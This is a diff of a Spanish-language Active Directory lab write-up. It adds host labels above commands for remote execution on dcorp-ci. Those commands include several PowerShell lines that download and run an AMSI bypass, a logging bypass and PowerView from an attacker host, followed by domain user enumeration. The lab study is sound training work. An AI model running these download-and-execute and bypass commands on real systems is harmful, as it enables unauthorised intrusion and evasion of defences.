@@ -355,6 +355,7 @@ Get-DomainGPO -Identity "DevOps Policy"
 Esperaremos y se nos tendría que asignar a nuestro usuario al grupo de Administradores locales en dcorp-ci
 Comprobaremos si se ha hecho efectivo ejecutando
 ```shell
+[student97]
 winrs -r:dcorp-ci cmd /c "set computername && set username"
 ```
 
@@ -388,6 +389,7 @@ En la maquina de dcorp-ci una vez hemos obtenido la reverse shell como en el lab
 
 Primero deberemos de cargar dos ficheros que nos ayudaran al bypass de la AMSI
 ```shell
+[Jenkins-dcorp-ci]
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
 ```
 ```shell
@@ -396,11 +398,13 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-
 
 Segundo ya una vez que hayamos ejecutado el bypass podremos cargar un PowerView
 ```shell
+[Jenkins-dcorp-ci]
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
 ```
 
 Una vez cargado podemos usar herramientas de este en este caso enumeraremos los usuarios conectados a los equipos de dominio
 ```shell
+[Jenkins-dcorp-ci]
 Find-DomainUserLocation
 ```
 
